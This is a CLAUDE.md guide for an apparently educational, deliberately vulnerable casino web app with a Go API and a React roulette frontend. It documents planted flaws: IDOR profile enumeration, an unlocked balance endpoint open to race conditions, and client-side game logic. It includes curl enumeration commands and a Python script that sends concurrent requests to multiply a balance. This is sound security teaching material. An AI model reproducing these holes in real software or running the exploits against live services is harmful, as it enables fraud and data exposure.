# CLAUDE.md

This file provides guidance to Claude Code when working with this monorepo.

## ⚠️ SECURITY WARNING

**This is an educational project for a Web Application Security course.**

This application contains **INTENTIONAL VULNERABILITIES** for educational purposes:
- **DO NOT** deploy to production
- **DO NOT** expose to the internet
- **ONLY** use in controlled local development environments
- These vulnerabilities demonstrate OWASP Top 10 attack chains

## Project Overview

This is a monorepo containing a vulnerable casino application with American Roulette:

- **Backend** (`casino-back/`): Go REST API with intentional security flaws
- **Frontend** (`ruleta/`): React Router 7 SSR application with TypeScript

**Educational Purpose**: Demonstrates vulnerability exploitation chains based on OWASP Top 10.

## Quick Start

### Prerequisites
- Go 1.24+ (with CGO enabled for SQLite)
- Node.js 20+
- npm

### Running the Application

**Terminal 1 - Backend:**
```bash
cd casino-back
go run cmd/api/main.go
# Runs on http://localhost:8080
```

**Terminal 2 - Frontend:**
```bash
cd ruleta
npm install
npm run dev
# Runs on http://localhost:5173
```

**Access**: Open http://localhost:5173 in your browser

## Architecture Overview

### Monorepo Structure

```
teamberos-vulnerable-app/
├── casino-back/          # Go backend API
│   ├── cmd/api/          # Application entry point
│   ├── internal/         # Internal packages
│   │   ├── database/     # SQLite database layer
│   │   ├── handlers/     # HTTP request handlers
│   │   ├── middleware/   # JWT auth middleware
│   │   └── models/       # Data models
│   ├── docs/             # API documentation
│   │   ├── swagger.yaml
│   │   └── postman_collection.json
│   └── casino.db         # SQLite database (generated)
│
└── ruleta/               # React frontend
    ├── app/              # Application code
    │   ├── components/   # React components
    │   ├── contexts/     # Global state (Auth, Balance)
    │   ├── routes/       # Route components
    │   ├── config/       # API configuration
    │   └── constants/    # Game constants
    └── CLAUDE.md         # Detailed frontend docs
```

### Technology Stack

**Backend:**
- Go 1.24 with Chi router
- SQLite3 with CGO (requires C compiler)
- JWT authentication (golang-jwt/jwt/v5)
- CORS enabled for localhost development

**Frontend:**
- React Router 7 (SSR-enabled)
- TypeScript with strict mode
- Tailwind CSS v4
- Global state via React Context API

## Backend API (`casino-back/`)

### Key Endpoints

**Authentication:**
- `POST /api/register` - Create new user (starts with $1000 balance)
- `POST /api/login` - Returns JWT token

**User Profile:**
- `GET /api/user/profile` - Get authenticated user profile
- `PUT /api/user/profile` - Update username/email

**Balance Management:**
- `GET /api/balance` - Get current balance
- `POST /api/balance/add` - Add balance (VULNERABLE)
- `POST /api/balance/deduct` - Deduct balance (VULNERABLE)

**Bets:**
- `POST /api/bets` - Record bet (VULNERABLE - doesn't process)
- `GET /api/bets` - Get bet history
- `GET /api/bets/:id` - Get specific bet

### Database Schema

**Tables:**
- `users` - User accounts (id, username, email, password_hash, role, created_at)
- `balances` - User balances (id, user_id, amount, updated_at)
- `bets` - Bet records (id, user_id, bet_type, bet_value, bet_amount, winning_number, winning_color, result, payout, created_at)

### Authentication Flow

1. User registers via `POST /api/register`
2. User logs in via `POST /api/login` → receives JWT token
3. Frontend stores token in localStorage
4. All authenticated requests include: `Authorization: Bearer <token>`
5. Backend middleware validates JWT and extracts user_id

### Important Implementation Notes

**CGO Requirement:**
The backend uses SQLite with the `mattn/go-sqlite3` driver, which requires CGO:
- Ensure `CGO_ENABLED=1` environment variable is set
- C compiler (gcc/clang) must be available
- Without CGO, the backend will not compile

**CORS Configuration:**
CORS is configured in `cmd/api/main.go` to allow:
- Origin: `http://localhost:5173`
- Methods: GET, POST, PUT, DELETE
- Headers: Authorization, Content-Type
- Credentials: Allowed

## Frontend (`ruleta/`)

See `ruleta/CLAUDE.md` for detailed frontend architecture.

### Key Features

**Global State Management:**
- `AuthContext` - JWT token, user info, login/register/logout
- `BalanceContext` - User balance with backend sync

**Routes:**
- `/` - Public home page (conditional: login CTA or user welcome)
- `/login` - Login form
- `/register` - Registration form
- `/roulette` - Roulette game (requires authentication)
- `/user/profile/:id` - User profile page (IDOR vulnerable - can view any profile)

**API Integration:**
- Config in `app/config/api.ts`
- `authenticatedFetch()` helper adds JWT to requests
- Balance syncs with backend via `GET /api/balance`
- Game flow uses `POST /api/balance/deduct` and `POST /api/balance/add`

### Game Flow (Roulette)

1. User places bets on betting board
2. User clicks "Spin"
3. Frontend calls `POST /api/balance/deduct` with total bet amount
4. Frontend calls `POST /api/bets` to record bet (backend just stores it)
5. **Frontend determines winner** (random number from ROULETTE_WHEEL)
6. Frontend calculates payout based on bet type and winning number
7. If user wins, frontend calls `POST /api/balance/add` with payout amount
8. Balance updates in UI

## Intentional Vulnerabilities

This application contains **educational vulnerabilities** forming an attack chain:

### 1. A01: Broken Access Control (IDOR)
- **✅ IMPLEMENTED** - Endpoint: `GET /api/user/profile/:id`
- Any authenticated user can view ANY other user's profile by changing the ID parameter
- Frontend route: `/user/profile/:id`
- No authorization check validates if requesting user has permission to view target profile
- Exposes username, email, role, balance, and account creation date

**Exploitation:**
```bash
# Login as any user, then enumerate profiles:
curl -H "Authorization: Bearer <token>" http://localhost:8080/api/user/profile/1
curl -H "Authorization: Bearer <token>" http://localhost:8080/api/user/profile/2
# Returns full profile including sensitive data for any user
```

**Frontend Access:**
- Navigate to `/user/profile/1`, `/user/profile/2`, etc. to view any profile
- Profile links available from home page and roulette page

### 2. A02: Cryptographic Failures
- **Not Yet Implemented** - Planned for password reset tokens
- Tokens should use weak MD5 hashing for predictability

### 3. A03: Injection (SQL Injection)
- **Not Yet Implemented** - Planned for `/bets?filter=<date>`
- Query should use string concatenation instead of parameterized queries

### 4. A04: Insecure Design (Race Condition + Trust Boundary)

**Currently Implemented:**

**Race Condition:**
- `POST /api/balance/add` has no transaction locking
- No duplicate detection or bet_id validation
- Allows multiple concurrent requests to credit the same winning bet
- **Exploit**: Send 10 parallel requests with same amount to multiply balance

**Insecure Trust Boundary:**
- Frontend controls entire game logic (winner determination, payout calculation)
- `POST /api/bets` only records bet, doesn't process it
- `POST /api/balance/deduct` doesn't verify sufficient balance (allows negative)
- `POST /api/balance/add` accepts any amount without validation
- **Exploit**: Modify frontend code to always "win" and claim arbitrary payouts

**Example Race Condition Exploit:**
```python
import requests
import threading

token = "your-jwt-token"
headers = {"Authorization": f"Bearer {token}"}

def exploit():
    requests.post(
        "http://localhost:8080/api/balance/add",
        json={"amount": 1000},
        headers=headers
    )

# Send 10 concurrent requests
threads = [threading.Thread(target=exploit) for _ in range(10)]
for t in threads: t.start()
# Result: Balance increases by $10,000 instead of $1,000
```

### Vulnerability Documentation

For detailed vulnerability specifications, see `ruleta/CLAUDE.md` lines 144-282.

### Secure Alternatives (NOT Implemented)

For reference, secure implementations would include:

1. **Race Conditions**: Database transactions with row-level locking
2. **Trust Boundary**: Server-side game logic with RNG
3. **Balance Validation**: Check sufficient funds before deducting
4. **Bet Validation**: Verify bet_id uniqueness, prevent duplicate credits
5. **IDOR**: Authorization checks (`req.user.id === resource.user_id`)
6. **SQL Injection**: Parameterized queries or ORM
7. **Crypto**: Cryptographically secure random tokens with expiration

## Development Workflow

### Making Changes to Backend

1. Edit files in `casino-back/internal/`
2. Restart server (Ctrl+C then `go run cmd/api/main.go`)
3. Test with Postman collection: `docs/postman_collection.json`

**Type Checking:**
```bash
cd casino-back
go build ./...
```

### Making Changes to Frontend

1. Edit files in `ruleta/app/`
2. HMR (Hot Module Replacement) updates automatically
3. For route changes: Update `app/routes.ts` and run `npm run typecheck`

**Type Checking:**
```bash
cd ruleta
npm run typecheck
```

**Production Build:**
```bash
cd ruleta
npm run build
npm start  # Runs production server on port 3000
```

### Adding New API Endpoints

1. **Define handler** in `casino-back/internal/handlers/`
2. **Register route** in `casino-back/cmd/api/main.go`
3. **Update documentation**:
   - `docs/swagger.yaml`
   - `docs/postman_collection.json`
4. **Create frontend integration** in `ruleta/app/config/api.ts` or relevant context

### Adding New Frontend Routes

1. **Add route** to `ruleta/app/routes.ts`
2. **Create route component** in `ruleta/app/routes/`
3. **Export meta function** for page metadata
4. **Run type generation**: `npm run typecheck`
5. **Import types**: `import type { Route } from "./+types/routename"`

## Testing the Application

### Manual Testing Flow

1. **Register**: Visit http://localhost:5173, click "Register", create account
2. **Login**: Use credentials to login → receives JWT token
3. **View Balance**: Home page shows $1000 starting balance
4. **Play Roulette**: Click "Play Roulette", place bets, spin wheel
5. **Check Balance**: Balance updates in real-time after wins/losses
6. **Logout**: Click logout button → redirects to login page

### API Testing with Postman

1. Import collection: `casino-back/docs/postman_collection.json`
2. Create environment with variables:
   - `base_url`: `http://localhost:8080`
   - `jwt_token`: (auto-set by login request)
   - `user_id`: (auto-set by register/login)
3. Run requests in order:
   - Register User → saves user_id
   - Login → saves jwt_token
   - Subsequent requests use saved token automatically

### Exploiting Vulnerabilities

**Race Condition Test:**
1. Login to get JWT token
2. Use provided Python script or Postman Runner
3. Send 10 concurrent `POST /api/balance/add` requests with `{"amount": 1000}`
4. Check balance → should be $10,000+ instead of $1,000

**Trust Boundary Test:**
1. Open browser DevTools → Sources tab
2. Set breakpoint in `ruleta/app/routes/roulette.tsx` at winner determination
3. Modify `randomIndex` to always select your bet number
4. Continue execution → frontend "wins" every time

## Common Issues

### Backend Won't Start

**Error**: `undefined: sqlite3.Driver` or similar
- **Cause**: CGO is disabled
- **Fix**: Set environment variable `CGO_ENABLED=1` and ensure C compiler is installed

**Error**: `database is locked`
- **Cause**: Multiple instances of backend running
- **Fix**: Kill all processes: `pkill -f "casino-back"` or `lsof -i :8080` and kill PIDs

### Frontend Issues

**Error**: SSR error with ReactNode types
- **Cause**: Direct import of types from React
- **Fix**: Use `import type React from "react"` pattern (see `ruleta/CLAUDE.md` lines 103-114)

**Error**: Route types not found
- **Cause**: Types not generated after route changes
- **Fix**: Run `npm run typecheck` to regenerate types

**Error**: Balance not updating
- **Cause**: Backend not running or CORS issue
- **Fix**: Ensure backend is running on port 8080 and check browser console for CORS errors

### CORS Errors

**Error**: `Access-Control-Allow-Origin` error in browser console
- **Cause**: Frontend URL doesn't match CORS configuration
- **Fix**: Ensure frontend runs on `http://localhost:5173` or update CORS config in `casino-back/cmd/api/main.go`

## Project Guidelines

### Code Style

**Backend (Go):**
- Follow standard Go conventions
- Use `gofmt` for formatting
- Intentional vulnerabilities must be commented with `// VULNERABLE:` prefix
- Example:
  ```go
  // VULNERABLE: No balance validation, allows negative balances
  _, err := database.DB.Exec(...)
  ```

**Frontend (TypeScript):**
- Strict TypeScript mode enabled
- Use path alias `~/` for imports from `app/` directory
- Intentional vulnerabilities must be commented with `// VULNERABLE:` or `⚠️ VULNERABLE:` prefix
- Never use emojis unless explicitly requested by user
- Prefer Edit tool over Write tool for existing files

### Security Annotations

Always document intentional vulnerabilities clearly:

```go
// VULNERABLE: No transaction locking - exploitable via race conditions
// This is intentional for educational purposes
```

```typescript
// VULNERABLE: Frontend determines winner - insecure trust boundary
// Real casino would use server-side RNG with cryptographic proofs
```

### Documentation Updates

When modifying API endpoints, **always update**:
1. `casino-back/docs/swagger.yaml` - OpenAPI specification
2. `casino-back/docs/postman_collection.json` - Postman collection
3. Add vulnerability warnings to endpoint descriptions

## Important Files Reference

### Configuration Files

- `casino-back/go.mod` - Go dependencies
- `ruleta/package.json` - Node dependencies
- `ruleta/react-router.config.ts` - SSR configuration
- `ruleta/app/app.css` - Tailwind theme with @theme directive

### Entry Points

- `casino-back/cmd/api/main.go` - Backend server startup
- `ruleta/app/root.tsx` - Frontend root with providers
- `ruleta/app/routes.ts` - Route definitions

### Core Business Logic

- `casino-back/internal/handlers/balance.go` - Balance operations
- `casino-back/internal/handlers/bets.go` - Bet recording
- `ruleta/app/routes/roulette.tsx` - Game logic
- `ruleta/app/constants/roulette.ts` - Roulette wheel data

### State Management

- `ruleta/app/contexts/AuthContext.tsx` - Authentication state
- `ruleta/app/contexts/BalanceContext.tsx` - Balance state with backend sync

## Additional Resources

- **Frontend Details**: See `ruleta/CLAUDE.md` for comprehensive frontend documentation
- **API Documentation**: See `casino-back/docs/swagger.yaml` for complete API spec
- **Postman Collection**: Import `casino-back/docs/postman_collection.json` for API testing

## Notes for Claude Code

- This is an **educational security project** - vulnerabilities are intentional
- When asked to "fix security issues", clarify if user wants to remove educational vulnerabilities
- Always check `ruleta/CLAUDE.md` for detailed frontend architecture before making changes
- Backend changes require manual restart (no hot reload)
- Frontend has HMR enabled - changes reflect immediately
- Use TodoWrite tool for complex multi-step tasks
- Prefer specialized tools (Read, Edit, Grep, Glob) over bash commands
- Always read files before editing them
